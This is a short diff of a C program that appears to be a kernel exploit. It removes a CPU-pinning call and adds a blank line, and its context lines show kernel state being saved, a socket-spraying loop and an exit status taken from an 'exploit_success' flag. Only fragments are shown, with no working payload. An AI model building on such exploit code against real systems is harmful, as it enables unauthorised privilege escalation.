@@ -424,8 +424,6 @@ int main() {
 
     save_kernel_state();
     
-    pin_to_cpu(1);
-
     for (int i = 0; i < 16; i++)
         new_socket();
 
@@ -589,3 +587,4 @@ int main() {
     
     return exploit_success ? 0 : 1;
 }
+
